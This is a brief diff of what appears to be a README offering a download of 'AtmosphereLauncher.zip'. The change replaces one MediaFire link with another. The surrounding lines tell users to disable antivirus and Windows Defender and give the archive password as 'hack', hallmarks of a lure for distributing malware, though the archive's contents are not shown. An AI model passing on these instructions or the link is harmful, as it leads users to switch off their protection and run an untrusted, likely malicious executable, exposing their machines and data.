@@ -11,7 +11,7 @@
 - Disable antivirus and windows Defender
 - password - hack
 
-|[Download](https://www.mediafire.com/file/w55mogrb88pph6f/AtmosphereLauncher.zip/file)
+|[Download](https://www.mediafire.com/file/myjwaifsthrzgqj/AtmosphereLauncher.zip/file)
 |:------------- |
 
 -----------------------------------------------------------------------------------------------------------------------
